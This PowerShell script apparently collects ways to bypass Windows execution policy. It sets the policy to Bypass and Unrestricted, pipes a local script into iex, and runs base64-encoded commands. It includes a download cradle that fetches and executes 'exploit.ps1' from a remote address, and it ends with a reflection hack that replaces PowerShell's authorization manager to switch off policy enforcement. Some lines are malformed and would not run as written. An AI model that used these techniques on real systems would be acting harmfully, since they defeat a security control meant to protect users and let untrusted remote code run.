# Bypass execution policy for the current process
Set-ExecutionPolicy Bypass -Scope Process

# Check execution policy for the current user and set it to Unrestricted
if (Get-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy UnRestricted) {
    Write-Output "Execution policy already set to Unrestricted for the current user."
} else {
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
}

# Made By Taylor Christian Newsome Twitter.com/ClumsyLulz

# Execute the script using various methods
. .\runme.ps1       # Execute the script directly
Get-Content .\runme.ps1 | PowerShell.exe -noprofile -      # Execute the script from file contents
Get-Content .\runme.ps1 | Invoke-Expression             # Execute the script from file contents using Invoke-Expression
GC .\runme.ps1 | iex                                 # Execute the script from file contents using iex
TYPE .\runme.ps1 | PowerShell.exe -noprofile -         # Execute the script from file contents using TYPE
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.0.1/exploit.ps1')"  # Download and execute a script from a URL

# Execute various commands directly
Write-Host "My voice is my passport, verify me."
$command = "Write-Host 'My voice is my passport, verify me.'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

# Execute a command on a remote computer
invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force

# Disable execution policy for the current session
function Disable-ExecutionPolicy {
    ($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))
}
Disable-ExecutionPolicy
